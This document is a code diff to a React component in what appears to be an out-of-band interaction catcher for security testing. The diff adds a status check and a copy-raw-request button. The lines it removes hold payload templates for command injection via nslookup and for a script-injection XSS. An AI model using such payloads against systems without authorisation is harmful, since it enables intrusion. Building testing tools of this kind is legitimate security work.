@@ -9,6 +9,7 @@ export default function SonarCatcher() {
   const [interactions, setInteractions] = useState([]);
   const [activeInteraction, setActiveInteraction] = useState(null);
   const [copiedUrl, setCopiedUrl] = useState(false);
+  const [copiedRaw, setCopiedRaw] = useState(false);
   const [error, setError] = useState(null);
 
   // Use refs to keep event handlers updated without re-rendering listeners
@@ -17,6 +18,22 @@ export default function SonarCatcher() {
 
   useEffect(() => {
     let removeListener = null;
+    
+    const initStatus = async () => {
+      try {
+        if (window.electronAPI && window.electronAPI.sonarStatus) {
+          const status = await window.electronAPI.sonarStatus();
+          if (status.running) {
+            setRunning(true);
+            setUrl(status.url);
+          }
+        }
+      } catch (e) {
+        console.error(e);
+      }
+    };
+    initStatus();
+
     if (window.electronAPI && window.electronAPI.onSonarInteraction) {
       removeListener = window.electronAPI.onSonarInteraction((data) => {
         // Add to top of list
@@ -79,6 +96,14 @@ export default function SonarCatcher() {
     return <Zap size={14} color="#FBBF24" />;
   };
 
+  const copyRawRequest = () => {
+    if (activeInteraction && activeInteraction.raw_request) {
+      navigator.clipboard.writeText(activeInteraction.raw_request);
+      setCopiedRaw(true);
+      setTimeout(() => setCopiedRaw(false), 2000);
+    }
+  };
+
   return (
     <div className="sonar-root">
       <div className="sonar-header">
@@ -118,15 +143,6 @@ export default function SonarCatcher() {
               <span className={url ? 'active' : 'inactive'}>{url || 'Waiting for engine to start...'}</span>
               {copiedUrl ? <CheckCircle2 size={16} color="#10B981" /> : <Copy size={16} />}
             </div>
-            
-            {url && (
-              <div className="sonar-quick-payloads">
-                <button onClick={() => copyPayloadTemplate('http://{{URL}}')}>HTTP</button>
-                <button onClick={() => copyPayloadTemplate('$(nslookup {{URL}})')}>RCE (nslookup)</button>
-                <button onClick={() => copyPayloadTemplate('"><script src="http://{{URL}}"></script>')}>XSS</button>
-                <button onClick={() => copyPayloadTemplate('{{URL}}')}>Raw</button>
-              </div>
-            )}
           </div>
 
           <div className="sonar-list-header">
@@ -190,7 +206,13 @@ export default function SonarCatcher() {
 
               <div className="sonar-raw-section">
                 <div className="sonar-raw-header">
-                  <Eye size={14} /> Raw Request Data
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                    <Eye size={14} /> Raw Request Data
+                  </div>
+                  <button className="sonar-copy-btn" onClick={copyRawRequest} title="Copy Raw Request">
+                    {copiedRaw ? <CheckCircle2 size={14} color="#10B981" /> : <Copy size={14} />} 
+                    {copiedRaw ? 'Copied!' : 'Copy Request'}
+                  </button>
                 </div>
                 <pre className="sonar-raw-code">
                   <code>{activeInteraction.raw_request || 'No raw data available.'}</code>
